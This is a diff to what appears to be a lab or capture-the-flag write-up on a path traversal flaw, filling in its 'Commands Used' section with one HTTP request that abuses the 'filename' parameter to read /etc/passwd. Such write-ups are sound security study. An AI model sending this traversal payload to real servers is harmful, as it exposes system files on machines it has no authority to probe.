@@ -42,7 +42,7 @@ The `filename` parameter is processed by the application, and improper validatio
 ## 🧱 Commands Used
 
 ```http
-<!-- Add the command you used here -->
+GET /image?filename=/var/www/images/../../../../../../../etc/passwd HTTP/2
 ```
 
 ---
